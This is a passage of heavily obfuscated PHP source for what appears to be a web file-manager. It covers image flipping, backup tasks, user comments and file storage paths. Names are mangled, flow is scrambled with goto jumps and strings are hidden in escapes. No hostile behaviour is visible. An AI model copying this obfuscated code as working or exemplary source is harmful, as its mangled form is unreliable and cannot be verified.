A¢î‘±Ë˜‰; AÒ†¬‹ßøƒ: return $DŒùÃ‘‘„˜; goto a¹Ô¥º”ƒÇ; a¹Ô¥º”ƒÇ: } function echoImage($c¾¿Îè¸Òô, $d¤ºÌõàÈ¬) { goto cïºß‰¸Ã; cïºß‰¸Ã: $F¨ˆœ÷Æ— =& $_SERVER[»„]; if (!$c¾¿Îè¸Òô) { return !1; } ob_get_clean(); goto F‹–ÙËš—; AêÉŠ–®: imageDestroy($this->im); return $d ¶“ÙÆóƒ; goto BÉö·ÍÄÓ‡; F‹–ÙËš—: $d ¶“ÙÆóƒ = !1; switch ($this->echoType) { case $F¨ˆœ÷Æ—[1839]: $d ¶“ÙÆóƒ = imagePNG($c¾¿Îè¸Òô); break; case $F¨ˆœ÷Æ—[163]: $d ¶“ÙÆóƒ = imagePNG($c¾¿Îè¸Òô, $d¤ºÌõàÈ¬); break; } imageDestroy($c¾¿Îè¸Òô); goto AêÉŠ–®; BÉö·ÍÄÓ‡: } } if (!function_exists($_SERVER[»„][1840])) { define($_SERVER[»„][1841], 0); define($_SERVER[»„][1842], 1); define($_SERVER[»„][1843], 2); function imageflip($dÇ´È÷ä„ã, $aå¯õçÕ»«) { switch ($aå¯õçÕ»«) { case IMG_FLIP_HORIZONTAL: $b¢¼¾Ÿ¨Àµ = imagesx($dÇ´È÷ä„ã) - 1; $D”¦÷Œ¥²ö = $b¢¼¾Ÿ¨Àµ / 2; $E‰Ôêò‘³Ş = imagesy($dÇ´È÷ä„ã); $C¥–¢›¸òÉ = imageistruecolor($dÇ´È÷ä„ã) ? imagecreatetruecolor(1, $E‰Ôêò‘³Ş) : imagecreate(1, $E‰Ôêò‘³Ş); for ($f§ ½¬¸‡— = 0; $f§ ½¬¸‡— < $D”¦÷Œ¥²ö; ++$f§ ½¬¸‡—) { imagecopy($C¥–¢›¸òÉ, $dÇ´È÷ä„ã, 0, 0, $f§ ½¬¸‡—, 0, 1, $E‰Ôêò‘³Ş); imagecopy($dÇ´È÷ä„ã, $dÇ´È÷ä„ã, $f§ ½¬¸‡—, 0, $b¢¼¾Ÿ¨Àµ - $f§ ½¬¸‡—, 0, 1, $E‰Ôêò‘³Ş); imagecopy($dÇ´È÷ä„ã, $C¥–¢›¸òÉ, $b¢¼¾Ÿ¨Àµ - $f§ ½¬¸‡—, 0, 0, 0, 1, $E‰Ôêò‘³Ş); } break; case IMG_FLIP_VERTICAL: $BÇ‚İÀˆ…¿ = imagesx($dÇ´È÷ä„ã); $Dš´¼„ = imagesy($dÇ´È÷ä„ã) - 1; $Bšİùğ¢ƒÕ = $Dš´¼„ / 2; $C¥–¢›¸òÉ = imageistruecolor($dÇ´È÷ä„ã) ? imagecreatetruecolor($BÇ‚İÀˆ…¿, 1) : imagecreate($BÇ‚İÀˆ…¿, 1); for ($bíĞêóĞù = 0; $bíĞêóĞù < $Bšİùğ¢ƒÕ; ++$bíĞêóĞù) { imagecopy($C¥–¢›¸òÉ, $dÇ´È÷ä„ã, 0, 0, 0, $bíĞêóĞù, $BÇ‚İÀˆ…¿, 1); imagecopy($dÇ´È÷ä„ã, $dÇ´È÷ä„ã, 0, $bíĞêóĞù, 0, $Dš´¼„ - $bíĞêóĞù, $BÇ‚İÀˆ…¿, 1); imagecopy($dÇ´È÷ä„ã, $C¥–¢›¸òÉ, 0, $Dš´¼„ - $bíĞêóĞù, 0, 0, $BÇ‚İÀˆ…¿, 1); } break; case IMG_FLIP_BOTH: $BÇ‚İÀˆ…¿ = imagesx($dÇ´È÷ä„ã); $E‰Ôêò‘³Ş = imagesy($dÇ´È÷ä„ã); $C¥–¢›¸òÉ = imagerotate($dÇ´È÷ä„ã, 180, 0); imagecopy($dÇ´È÷ä„ã, $C¥–¢›¸òÉ, 0, 0, 0, 0, $BÇ‚İÀˆ…¿, $E‰Ôêò‘³Ş); break; default: return; } imagedestroy($C¥–¢›¸òÉ); } } goto E£›õµßÜ; d¯İ´Ò«±Ù: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\142\x61\x63\x6b\165\160\114\x69\163\x74"; public $field = array("\x69\157", "\x6e\x61\x6d\145", "\163\x74\x61\164\x75\163", "\143\157\156\164\x65\156\x74", "\x72\x65\163\165\154\x74", "\164\151\x6d\145\x46\x72\157\155", "\164\x69\x6d\145\x54\157"); public function config() { goto bÍéâÖ‡Óí; Bêåñ½¨: if (isset($F™é½á‰ëš[$d ‘µŠ¼íÛ[186]])) { $F™é½á‰ëš[$d ‘µŠ¼íÛ[186]] = json_decode($F™é½á‰ëš[$d ‘µŠ¼íÛ[186]], !0); } if (isset($cë®Ÿ®¤¬Ş[$d ‘µŠ¼íÛ[186]])) { $F™é½á‰ëš[$d ‘µŠ¼íÛ[186]][$d ‘µŠ¼íÛ[1384]] = $cë®Ÿ®¤¬Ş[$d ‘µŠ¼íÛ[186]]; unset($cë®Ÿ®¤¬Ş[$d ‘µŠ¼íÛ[186]]); } return array_merge($F™é½á‰ëš, $cë®Ÿ®¤¬Ş); goto E…²·îìÄõ; bÍéâÖ‡Óí: $d ‘µŠ¼íÛ =& $_SERVER[»„]; $cë®Ÿ®¤¬Ş = Model($d ‘µŠ¼íÛ[1076])->get($d ‘µŠ¼íÛ[700]); $cë®Ÿ®¤¬Ş = json_decode($cë®Ÿ®¤¬Ş, !0); goto ešÈ–÷Çïˆ; ešÈ–÷Çïˆ: $cë®Ÿ®¤¬Ş = is_array($cë®Ÿ®¤¬Ş) ? $cë®Ÿ®¤¬Ş : array(); if (!isset($cë®Ÿ®¤¬Ş[$d ‘µŠ¼íÛ[680]])) { $cë®Ÿ®¤¬Ş[$d ‘µŠ¼íÛ[680]] = $d ‘µŠ¼íÛ[464]; } $F™é½á‰ëš = array(); goto F‰…å“ ¯ê; F‰…å“ ¯ê: Action($d ‘µŠ¼íÛ[2094])->taskInit(); $aÓõ¨Ô¬«í = Model($d ‘µŠ¼íÛ[2095])->listData(); foreach ($aÓõ¨Ô¬«í as $AÊ©½„ø…£) { if ($AÊ©½„ø…£[$d ‘µŠ¼íÛ[1068]] == $d ‘µŠ¼íÛ[83] && $AÊ©½„ø…£[$d ‘µŠ¼íÛ[1397]] == $d ‘µŠ¼íÛ[2096]) { $F™é½á‰ëš = $AÊ©½„ø…£; break; } } goto Bêåñ½¨; E…²·îìÄõ: } public function listData($b²ˆ¥¥¦É© = false, $BÓÛè®ÚÏ‹ = "\155\x6f\x64\151\x66\x79\124\151\x6d\x65", $dÄ‡—®îÍŠ = false) { return parent::listData($b²ˆ¥¥¦É©, $BÓÛè®ÚÏ‹, !0); } public function lastItem() { $d÷ÕÛÆÀäØ = $this->listData(); return !empty($d÷ÕÛÆÀäØ[0]) ? $d÷ÕÛÆÀäØ[0] : null; } public function kill($dÚ¼æİ‡ ) { goto C¸«¦ç¥ÃÆ; b„ŒŞ¡ğé©: return $this->remove($dÚ¼æİ‡ ); goto Eƒ•ØÃ›¸ï; AíÕ×í™éõ: $BÔİ„Ë°Ş = $D»°ï»³§[$BŠË¨ŸĞ›[28]]; $bùá­µöÄ = TEMP_FILES . $BŠË¨ŸĞ›[698] . $BÔİ„Ë°Ş . $BŠË¨ŸĞ›[8]; IO::remove($bùá­µöÄ, !1); goto b„ŒŞ¡ğé©; d¡Ãƒ¨ø°ˆ: Task::kill($BŠË¨ŸĞ›[699]); Task::kill($BŠË¨ŸĞ›[717]); Task::kill($BŠË¨ŸĞ›[724]); goto AíÕ×í™éõ; C¸«¦ç¥ÃÆ: $BŠË¨ŸĞ› =& $_SERVER[»„]; $D»°ï»³§ = $this->listData($dÚ¼æİ‡ ); if (!$D»°ï»³§ || empty($D»°ï»³§[$BŠË¨ŸĞ›[28]])) { return !0; } goto d¡Ãƒ¨ø°ˆ; Eƒ•ØÃ›¸ï: } public function remove($cáîÂ»¦à) { $fÑ¤Õ…Û×Ì = $this->listData($cáîÂ»¦à); if (!$fÑ¤Õ…Û×Ì) { return !0; } return $this->backupRemove($fÑ¤Õ…Û×Ì); } private function backupRemove($FÀ’¹öèµÇ) { $CÓ¦Ûé·§ =& $_SERVER[»„]; parent::remove($FÀ’¹öèµÇ[$CÓ¦Ûé·§[363]]); $d¶¶ˆ½‰í£ = "\x7b\151\x6f\72{$FÀ’¹öèµÇ[$CÓ¦Ûé·§[679]]}\175\57\144\141\164\x61\142\x61\x73\145\57\x62\141\143\153\x75\160\x5f" . $FÀ’¹öèµÇ[$CÓ¦Ûé·§[28]]; IO::remove($d¶¶ˆ½‰í£, !1); return !0; } public function start() { goto b•¨é‡ÁòÉ; e¨¦×¬·¶Ô: if (!$c±¢ó©õÊ->dbFile()) { return !1; } if ($DËšÀ¤Ê¢é[$e¹ÊØÎ·­•[680]] == $e¹ÊØÎ·­•[464]) { $c±¢ó©õÊ->file(); } Backup::set(array($e¹ÊØÎ·­•[677] => 1, $e¹ÊØÎ·­•[691] => time())); goto AµÑ‚¡£ß›; cÃ‡ƒƒ®Ã: $c±¢ó©õÊ = new Backup(); $c±¢ó©õÊ->keep(); if (!$c±¢ó©õÊ->db()) { return !1; } goto e¨¦×¬·¶Ô; cé•ˆŸ‰…Ú: if (!$DËšÀ¤Ê¢é || $DËšÀ¤Ê¢é[$e¹ÊØÎ·­•[1381]] != $e¹ÊØÎ·­•[83]) { return !1; } $A±›¡‹‘ÇÅ = $this->process(); foreach ($A±›¡‹‘ÇÅ as $BÆÁò‡´µÎ) { if ($BÆÁò‡´µÎ) { return Task::restart($BÆÁò‡´µÎ[$e¹ÊØÎ·­•[363]]); } } goto cÃ‡ƒƒ®Ã; AµÑ‚¡£ß›: return !0; goto A¨Í÷óÛ¨º; b•¨é‡ÁòÉ: $e¹ÊØÎ·­• =& $_SERVER[»„]; if ($GLOBALS[$e¹ÊØÎ·­•[6]][$e¹ÊØÎ·­•[84]][$e¹ÊØÎ·­•[2097]] != $e¹ÊØÎ·­•[83]) { return !0; } $DËšÀ¤Ê¢é = $this->config(); goto cé•ˆŸ‰…Ú; A¨Í÷óÛ¨º: } public function process() { $A†³°³ÒÑ„ =& $_SERVER[»„]; return array($A†³°³ÒÑ„[682] => Task::get($A†³°³ÒÑ„[699]), $A†³°³ÒÑ„[685] => Task::get($A†³°³ÒÑ„[717]), $A†³°³ÒÑ„[163] => Task::get($A†³°³ÒÑ„[724])); } public function restore() { $dö×‘¦Æ =& $_SERVER[»„]; ActionCall($dö×‘¦Æ[2098], !0, 1); ActionCall($dö×‘¦Æ[2098], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\x6d\x65" => "\143\157\155\x6d\145\x6e\164\137\x6d\x65\x74\141", "\x6d\x65\164\x61\x46\151\145\154\144" => "\143\x6f\155\x6d\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($E¡»‰ïË…) { $C÷ôäÉ­ö¥ =& $_SERVER[»„]; if ($E¡»‰ïË…[$C÷ôäÉ­ö¥[2099]]) { $c„óô”Œé = $this->where(array($C÷ôäÉ­ö¥[2100] => $E¡»‰ïË…[$C÷ôäÉ­ö¥[2099]]))->find(); if (!$c„óô”Œé || $c„óô”Œé[$C÷ôäÉ­ö¥[367]] != $E¡»‰ïË…[$C÷ôäÉ­ö¥[367]] || $c„óô”Œé[$C÷ôäÉ­ö¥[452]] != $E¡»‰ïË…[$C÷ôäÉ­ö¥[452]]) { return !1; } $this->where(array($C÷ôäÉ­ö¥[2100] => $E¡»‰ïË…[$C÷ôäÉ­ö¥[2099]]))->setAdd($C÷ôäÉ­ö¥[2101], 1); } return $this->add($E¡»‰ïË…); } public function remove($FÉŠù·ÎÜ©) { $D»˜·¤Õ =& $_SERVER[»„]; $E¸™£°Î×‘ = array($D»˜·¤Õ[2100] => $FÉŠù·ÎÜ©); $cñÛßğÒäê = $this->where($E¸™£°Î×‘)->find(); if ($cñÛßğÒäê[$D»˜·¤Õ[2099]]) { $this->where(array($D»˜·¤Õ[2100] => $cñÛßğÒäê[$D»˜·¤Õ[2099]]))->setAdd($D»˜·¤Õ[2101], -1); } return $this->where($E¸™£°Î×‘)->delete(); } public function edit($C†¶ªá’Ìù, $bÏ¤™“œÌ‘) { $d‘á´Ã‰ì =& $_SERVER[»„]; $aº¸ëùÚò = array($d‘á´Ã‰ì[2100] => $C†¶ªá’Ìù); return $this->where($aº¸ëùÚò)->save(array($d‘á´Ã‰ì[2102] => $bÏ¤™“œÌ‘)); } public function prasise($AÙì¡³²Ô¡) { $D¤Î°Ä¶ÔÚ =& $_SERVER[»„]; $eğÉ«­ó = Model($D¤Î°Ä¶ÔÚ[2103]); $Bà…šİ±±÷ = array($D¤Î°Ä¶ÔÚ[2100] => $AÙì¡³²Ô¡, $D¤Î°Ä¶ÔÚ[1400] => USER_ID); $eŒ±¢Ë‹Õ² = $eğÉ«­ó->where($Bà…šİ±±÷)->find(); if (!$eŒ±¢Ë‹Õ²) { $eğÉ«­ó->add($Bà…šİ±±÷); $a‰©Ô³Ó° = $this->where(array($D¤Î°Ä¶ÔÚ[2100] => $AÙì¡³²Ô¡))->setAdd($D¤Î°Ä¶ÔÚ[2104], 1); } else { $eğÉ«­ó->where($Bà…šİ±±÷)->delete(); $a‰©Ô³Ó° = $this->where(array($D¤Î°Ä¶ÔÚ[2100] => $AÙì¡³²Ô¡))->setAdd($D¤Î°Ä¶ÔÚ[2104], -1); } return $a‰©Ô³Ó°; } public function targetInfo($bğÇ›™, $bĞäâ’ÃØˆ) { goto DÔÛìŠñ˜±; b­±¡Úö: $fÜ¾ƒèù… = "\122\x49\x47\x48\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\x6d\155\x65\x6e\164\137\x70\x72\141\151\x73\145\40\163\x74\x61\162\40\x6f\156\40\143\x6f\x6d\155\145\x6e\x74\x2e\143\x6f\x6d\x6d\x65\156\x74\x49\104\x20\x3d\x20\x73\164\x61\162\56\x63\157\x6d\155\145\x6e\x74\x49\x44"; $câ¸™·˜ŸÎ = $this->alias($côêšÑ•¤‡[337])->where($dê¹œÁÏà÷)->join($fÜ¾ƒèù…, $côêšÑ•¤‡[2105])->count(); $DøƒÊ¿éš = array($côêšÑ•¤‡[2106] => $FÓ¸á‚æçš, $côêšÑ•¤‡[2107] => $câ¸™·˜ŸÎ); goto F¯¬™Íö±†; DÔÛìŠñ˜±: $côêšÑ•¤‡ =& $_SERVER[»„]; $dê¹œÁÏà÷ = array($côêšÑ•¤‡[517] => $bğÇ›™, $côêšÑ•¤‡[518] => $bĞäâ’ÃØˆ); $FÓ¸á‚æçš = $this->where($dê¹œÁÏà÷)->count(); goto b­±¡Úö; F¯¬™Íö±†: return $DøƒÊ¿éš; goto C£¥’”Ëî; C£¥’”Ëî: } public function listData($dÑÄ´ğƒ‘) { $A¿Ëé÷¾Ÿ‘ =& $_SERVER[»„]; if (isset($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2108]])) { if ($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2108]]) { $dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2109]] = array($A¿Ëé÷¾Ÿ‘[918], intval($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2108]])); } unset($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2108]]); } if (isset($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2110]])) { if ($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2110]]) { $dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2109]] = array($A¿Ëé÷¾Ÿ‘[915], intval($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2110]])); } unset($dÑÄ´ğƒ‘[$A¿Ëé÷¾Ÿ‘[2110]]); } return $this->_listData($dÑÄ´ğƒ‘); } private function _listData($A»„„˜ùİÈ) { $F½†®ÜÉ— =& $_SERVER[»„]; $e‘ºÒí—æ = $this->where($A»„„˜ùİÈ)->_makeOrder()->selectPage(100); $this->_listAppendParent($e‘ºÒí—æ[$F½†®ÜÉ—[350]]); $this->_listAppendUser($e‘ºÒí—æ[$F½†®ÜÉ—[350]]); $this->_listAppendMeta($e‘ºÒí—æ[$F½†®ÜÉ—[350]]); return $e‘ºÒí—æ; } private function _makeOrder() { $c¤´ğ®•±§ =& $_SERVER[»„]; $DÆ¹Üˆ¯çô = array($c¤´ğ®•±§[2104], $c¤´ğ®•±§[2101], $c¤´ğ®•±§[183]); $CÃÛ›„¸âÍ = Input::get($c¤´ğ®•±§[403], $c¤´ğ®•±§[7], $c¤´ğ®•±§[385], $DÆ¹Üˆ¯çô); $d ±ºğšï = Input::get($c¤´ğ®•±§[404], $c¤´ğ®•±§[7], $c¤´ğ®•±§[1402], array($c¤´ğ®•±§[2111], $c¤´ğ®•±§[401])); $Cê¨Ç»«ÀÕ = $CÃÛ›„¸âÍ . $c¤´ğ®•±§[50] . $d ±ºğšï; return $this->order($Cê¨Ç»«ÀÕ); } private function _listAppendParent(&$fÚ°éÔÚš) { goto eäÎÜãîå¯; ašÂƒ¿Ê¨Æ: if (!$eêè…¯¥Òª) { return; } $A¦¶ÓâÈ°¥ = $this->where(array($aÎÓÓ“øÍ[2100] => array($aÎÓÓ“øÍ[7], $eêè…¯¥Òª)))->select(); $A¦¶ÓâÈ°¥ = array_to_keyvalue($A¦¶ÓâÈ°¥, $aÎÓÓ“øÍ[2109]); goto Aî¨ßñ´ê‘; eäÎÜãîå¯: $aÎÓÓ“øÍ =& $_SERVER[»„]; $eêè…¯¥Òª = array_unique(array_to_keyvalue($fÚ°éÔÚš, $aÎÓÓ“øÍ[33], $aÎÓÓ“øÍ[2099])); $eêè…¯¥Òª = array_remove_value($eêè…¯¥Òª, $aÎÓÓ“øÍ[464]); goto ašÂƒ¿Ê¨Æ; Aî¨ßñ´ê‘: foreach ($fÚ°éÔÚš as &$BØà©µ…) { if (isset($A¦¶ÓâÈ°¥[$BØà©µ…[$aÎÓÓ“øÍ[2099]]])) { $BØà©µ…[$aÎÓÓ“øÍ[2112]] = $A¦¶ÓâÈ°¥[$BØà©µ…[$aÎÓÓ“øÍ[2099]]]; } } goto FèèÇ±ƒñ; FèèÇ±ƒñ: } private function _listAppendUser(&$dĞ™‰ğ¤ŸÊ) { goto D¤—±ò¤å˜; D¤—±ò¤å˜: $d¸×ÙˆÌÒ =& $_SERVER[»„]; $dñÈÀô§»À = array_unique(array_to_keyvalue($dĞ™‰ğ¤ŸÊ, $d¸×ÙˆÌÒ[33], $d¸×ÙˆÌÒ[1409])); $dñÈÀô§»À = array_remove_value($dñÈÀô§»À, $d¸×ÙˆÌÒ[464]); goto aÇËŸø¾´ƒ; aÇËŸø¾´ƒ: if (count($dñÈÀô§»À) == 0) { return; } foreach ($dĞ™‰ğ¤ŸÊ as $EøÔŠ›ø¥²) { if (isset($EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[2112]])) { $dñÈÀô§»À[] = $EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[2112]][$d¸×ÙˆÌÒ[1409]]; } } $a‡Ú‰Œ¦Œœ = Model($d¸×ÙˆÌÒ[473])->userListInfo($dñÈÀô§»À); goto cª¼ë«Ÿ‡Ù; cª¼ë«Ÿ‡Ù: foreach ($dĞ™‰ğ¤ŸÊ as &$EøÔŠ›ø¥²) { $EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[531]] = $a‡Ú‰Œ¦Œœ[$EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[1409]]]; if (isset($EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[2112]])) { $EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[2112]][$d¸×ÙˆÌÒ[531]] = $a‡Ú‰Œ¦Œœ[$EøÔŠ›ø¥²[$d¸×ÙˆÌÒ[2112]][$d¸×ÙˆÌÒ[1409]]]; } } goto F®…ÖšÅÌ”; F®…ÖšÅÌ”: } private function _listAppendMeta(&$DÏ³ó¡ô…†) { goto bí¤Æ’İåÉ; A®ŸŞ‚µ—•: if (!$D°ÖÌˆÕ“) { return !1; } foreach ($DÏ³ó¡ô…† as &$b‘¹…¬ÜŒ§) { $b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[413]] = $D°ÖÌˆÕ“[$b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[2109]]]; if (isset($b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[2112]])) { $b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[2112]][$FÑ³±ÈŸŠä[413]] = $D°ÖÌˆÕ“[$b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[2112]][$FÑ³±ÈŸŠä[2109]]]; } } goto B¥Œµê¢ƒá; bí¤Æ’İåÉ: $FÑ³±ÈŸŠä =& $_SERVER[»„]; $CéÀ–Ì² = array_unique(array_to_keyvalue($DÏ³ó¡ô…†, $FÑ³±ÈŸŠä[33], $FÑ³±ÈŸŠä[2109])); $CéÀ–Ì² = array_remove_value($CéÀ–Ì², $FÑ³±ÈŸŠä[464]); goto d­İõ­®Üõ; d­İõ­®Üõ: if (!$CéÀ–Ì²) { return; } foreach ($DÏ³ó¡ô…† as $b‘¹…¬ÜŒ§) { if (isset($b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[2112]])) { $CéÀ–Ì²[] = $b‘¹…¬ÜŒ§[$FÑ³±ÈŸŠä[2112]][$FÑ³±ÈŸŠä[2109]]; } } $D°ÖÌˆÕ“ = $this->metaList($CéÀ–Ì²); goto A®ŸŞ‚µ—•; B¥Œµê¢ƒá: } private function metaList($c˜ï’±¬å) { goto Fàø¬¦ã£Ÿ; f˜‰îî¾²¬: return $e°ˆò¿áõ ? $e°ˆò¿áõ : array(); goto bã®„ÎöŒÂ; dšµ®²Ã±: $e°ˆò¿áõ = Model($Côµ®·„Œ[2113])->where($E±é œŒŞí)->select(); $e°ˆò¿áõ = array_to_keyvalue_group($e°ˆò¿áõ, $Côµ®·„Œ[2109]); foreach ($e°ˆò¿áõ as $e¼›ĞãŒß => $EÂÎè²ŠÉ) { $c‚å¢–º¥İ = array(); foreach ($EÂÎè²ŠÉ as $f’Û¡ê»í) { $c‚å¢–º¥İ[$f’Û¡ê»í[$Côµ®·„Œ[89]]] = $f’Û¡ê»í[$Côµ®·„Œ[355]]; } $e°ˆò¿áõ[$e¼›ĞãŒß] = $c‚å¢–º¥İ; } goto f˜‰îî¾²¬; Fàø¬¦ã£Ÿ: $Côµ®·„Œ =& $_SERVER[»„]; if (!$c˜ï’±¬å) { return array(); } $E±é œŒŞí = array($Côµ®·„Œ[2109] => array($Côµ®·„Œ[7], $c˜ï’±¬å)); goto dšµ®²Ã±; bã®„ÎöŒÂ: } } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\155\x65" => "\x69\x6f\x5f\146\x69\154\145\137\x6d\x65\164\141", "\155\x65\x74\141\106\151\x65\x6c\x64" => "\x66\x69\154\x65\111\104"); public function fileInfo($EÈÙÛéöÙª) { $CÌ’¿½®Ï­ =& $_SERVER[»„]; static $dÄÑõ—ëÌ© = array(); if (!isset($dÄÑõ—ëÌ©[$EÈÙÛéöÙª])) { $fŸ­…¶÷åÉ = $CÌ’¿½®Ï­[2114]; $b•Ä‘÷¿İ = Model($CÌ’¿½®Ï­[418])->field($fŸ­…¶÷åÉ)->where(array($CÌ’¿½®Ï­[416] => $EÈÙÛéöÙª))->find(); $dÄÑõ—ëÌ©[$EÈÙÛéöÙª] = $b•Ä‘÷¿İ; } return $dÄÑõ—ëÌ©[$EÈÙÛéöÙª]; } public function addFileByContent($BË§¼¥ÔÅ” = '', $a×¹²Äù” = '') { goto D¦›Èğ·ø³; FÉÔéß¢¬: $e³ª±ø„à‹ = $AÔÉ¡Ö•Ğ“ . $f¡Ü»¨ùš[2116] . rand_string(16); file_put_contents($e³ª±ø„à‹, $BË§¼¥ÔÅ”); $dĞ¥ã´®ĞÜ = $this->addFile($e³ª±ø„à‹, $a×¹²Äù”, !0); goto FÒŸåÇÅÄ°; D¦›Èğ·ø³: $f¡Ü»¨ùš =& $_SERVER[»„]; $AÔÉ¡Ö•Ğ“ = TEMP_PATH . $f¡Ü»¨ùš[2115]; if (!is_dir($AÔÉ¡Ö•Ğ“)) { mk_dir($AÔÉ¡Ö•Ğ“); } goto FÉÔéß¢¬; FÒŸåÇÅÄ°: if (file_exists($e³ª±ø„à‹)) { @unlink($e³ª±ø„à‹); } return $dĞ¥ã´®ĞÜ; goto aŞÀÑ£»„Š; aŞÀÑ£»„Š: } public function createFileName($b–õ¾Õ–ÌÒ) { goto bÎÈ³ö”ÓÌ; bÎÈ³ö”ÓÌ: $Bì¾ù¯ƒÁ¢ =& $_SERVER[»„]; $f†§ì®°Ê° = IO::init($Bì¾ù¯ƒÁ¢[8]); $d÷Íãğ®ã = $this->makeFilePath($b–õ¾Õ–ÌÒ, $f†§ì®°Ê°); goto D¦†‡¿ÈÃÀ; D¦†‡¿ÈÃÀ: $Cìñ…ÅÕ® = $f†§ì®°Ê°->pathFather($d÷Íãğ®ã); static $A´‰”ìË¼Ò = false; $Bæ½Í—©ŒÍ = $Bì¾ù¯ƒÁ¢[2117] . md5($Cìñ…ÅÕ®); goto a‘ƒ“ßŸ»¢; a‘ƒ“ßŸ»¢: if (!$A´‰”ìË¼Ò && !Cache::get($Bæ½Í—©ŒÍ)) { $A´‰”ìË¼Ò = !0; $b”‰Š  = IO::mkdir($Cìñ…ÅÕ®); if (!IO::exist($b”‰Š  . $Bì¾ù¯ƒÁ¢[2118])) { IO::mkfile($b”‰Š  . $Bì¾ù¯ƒÁ¢[2118]); } Cache::set($Bæ½Í—©ŒÍ, 1, 3600 * 2); } return $d÷Íãğ®ã; goto AÖä¬„“; AÖä¬„“: } public function makeFilePath($A¾è—ˆ‰”ô, $Aµ¿¹¯Ç¹§) { goto Eœ¥²·Şõ™; F­°á¯: switch ($EÏÍ³Óòˆ­) { case $fòø³²’Ú[2122]: $b‡ë‹ˆš² = $b‡ë‹ˆš² . $fòø³²’Ú[91] . $Aµ¿¹¯Ç¹§->ext($A¾è—ˆ‰”ô); if ($Aµ¿¹¯Ç¹§->ext($A¾è—ˆ‰”ô) == $fòø³²’Ú[2062]) { $b‡ë‹ˆš² .= $fòø³²’Ú[2123]; } break; case $fòø³²’Ú[2124]: goto CêæïÜÕ½ ; fÚóÖíšÀ: break; goto fÛ›á´Úí§; fó£æ×’“ª: if ($Aµ¿¹¯Ç¹§->ext($A¾è—ˆ‰”ô) == $fòø³²’Ú[2062]) { $A¾è—ˆ‰”ô .= $fòø³²’Ú[2123]; } $BãÀæÌÂö¼ = IO::fileNameAuto($E‡Ş»’—åÅ, $A¾è—ˆ‰”ô); $b‡ë‹ˆš² = $E‡Ş»’—åÅ . $BãÀæÌÂö¼; goto fÚóÖíšÀ; CêæïÜÕ½ : $f‘ËÄñŞÛÂ = Model($fòø³²’Ú[1076])->get($fòø³²’Ú[1309]); $Eï›Ìì»³ = substr(md5($fòø³²’Ú[1882] . $f‘ËÄñŞÛÂ . date($fòø³²’Ú[675])), 0, 8); $E‡Ş»’—åÅ = KodIO::defaultIO() . date($fòø³²’Ú[2125]) . $Eï›Ìì»³ . $fòø³²’Ú[8]; goto fó£æ×’“ª; fÛ›á´Úí§: case $fòø³²’Ú[2121]: break; default: break; } return $b‡ë‹ˆš²; goto AÎ—–İ£œ; Eœ¥²·Şõ™: $fòø³²’Ú =& $_SERVER[»„]; $EÏÍ³Óòˆ­ = Model($fòø³²’Ú[1076])->get($fòø³²’Ú[2119]); $E‡Ş»’—åÅ = KodIO::defaultIO() . date($fòø³²’Ú[2120]); goto AôİæÒêÅ; AôİæÒêÅ: $b‡ë‹ˆš² = $E‡Ş»’—åÅ . rand_string(5) . short_id(100); $A¾è—ˆ‰”ô = str_replace($fòø³²’Ú[8], $fòø³²’Ú[70], KodIO::clear($A¾è—ˆ‰”ô)); if (!$A¾è—ˆ‰”ô) { $EÏÍ³Óòˆ­ = $fòø³²’Ú[2121]; } goto F­°á¯; AÎ—–İ£œ: } public function addFileByRemote($F„ä·ÀÂÌ, $fôÅñ•¢Çë, $fĞ“ÖëòÍÔ = array()) { goto D¯ñŞ¹—öö; fÛĞŒù‹àÒ: if ($B¬Å„¨†¼ = $this->addFileCheckExist($dá²›ĞØÈ[$A‰†É†ØÑ[160]], $dá²›ĞØÈ[$A‰†É†ØÑ[159]], $dá²›ĞØÈ[$A‰†É†ØÑ[77]])) { return $B¬Å„¨†¼; } return $this->addFileData($dá²›ĞØÈ); goto aÁãÃÖª¼Ô; Fâ±ŠÜìÃ: $B’ÙŒŠËß = IO::hashMd5($F„ä·ÀÂÌ, $bÚ¼ğÔ„í); $Eè› ÉŒñÚ = KodIO::defaultDriver(); $dá²›ĞØÈ = array($A‰†É†ØÑ[516] => IO::size($F„ä·ÀÂÌ), $A‰†É†ØÑ[2126] => 1, $A‰†É†ØÑ[382] => $fôÅñ•¢Çë, $A‰†É†ØÑ[723] => $Eè› ÉŒñÚ[$A‰†É†ØÑ[363]], $A‰†É†ØÑ[383] => $F„ä·ÀÂÌ, $A‰†É†ØÑ[2127] => $fĞ“ÖëòÍÔ[$A‰†É†ØÑ[160]] ? $fĞ“ÖëòÍÔ[$A‰†É†ØÑ[160]] : 